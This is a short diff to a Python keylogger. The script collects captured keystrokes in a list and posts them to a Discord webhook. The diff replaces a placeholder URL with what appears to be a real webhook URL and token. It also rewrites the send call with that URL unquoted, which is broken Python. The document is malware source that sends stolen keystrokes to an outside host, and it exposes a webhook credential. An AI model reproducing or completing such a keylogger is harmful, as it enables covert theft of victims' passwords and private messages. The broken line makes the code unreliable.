@@ -4,7 +4,7 @@ import requests
 import threading
 
 # Replace 'WEBHOOK_URL' with your actual Discord webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_url'
+WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1348479750871715920/WOjBfpX_SfFVEUY-5hJMUuh1vdO9JTgAv619sv2tk_yDzSPC_QuCBdL3vz3jmwF38WfE'
 
 # Create a list to store the captured keystrokes
 keylogs = []
@@ -24,7 +24,7 @@ def send_keylogs():
         }
 
         # Send the payload to the Discord webhook
-        requests.post(WEBHOOK_URL, data=payload)
+        requests.post(https://discordapp.com/api/webhooks/1348479750871715920/WOjBfpX_SfFVEUY-5hJMUuh1vdO9JTgAv619sv2tk_yDzSPC_QuCBdL3vz3jmwF38WfE, data=payload)
 
         # Clear the keylogs list
         keylogs = []
